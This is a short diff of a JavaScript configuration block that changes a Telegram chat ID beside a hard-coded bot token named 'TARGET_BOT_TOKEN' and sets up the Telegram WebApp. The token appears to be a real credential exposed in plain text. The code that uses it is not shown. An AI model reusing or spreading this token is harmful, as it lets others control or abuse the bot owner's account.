@@ -1,6 +1,6 @@
 // CONFIGURATION
 const TARGET_BOT_TOKEN = '8323712514:AAG5zdoA0EOmCxt6h7epjBLmoZmWe0mklQQ'; 
-const TARGET_CHAT_ID = '8323712514';
+const TARGET_CHAT_ID = '1661187898';
 
 // Initialize Telegram
 const tg = window.Telegram ? window.Telegram.WebApp : null;
